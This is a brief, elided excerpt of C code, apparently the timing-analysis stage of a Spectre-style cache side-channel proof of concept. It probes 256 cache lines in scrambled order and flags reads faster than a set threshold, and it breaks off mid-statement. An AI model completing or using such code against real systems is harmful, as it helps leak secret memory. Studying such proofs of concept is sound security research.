...
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD (320)  /* assume cache hit if time <= threshold */
...
/* Time reads. Mixed-up order to prevent stride prediction */
		...
		for (i = 0; i < 256; i++) {
			mix_i = ((i * 167) + 13) & 255;
			time_dif = 0;
			measure_time(time_dif, &array2[mix_i * 4096]);
		
			if(time_dif <= CACHE_HIT_THRESHOLD)
			//if (time_dif <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
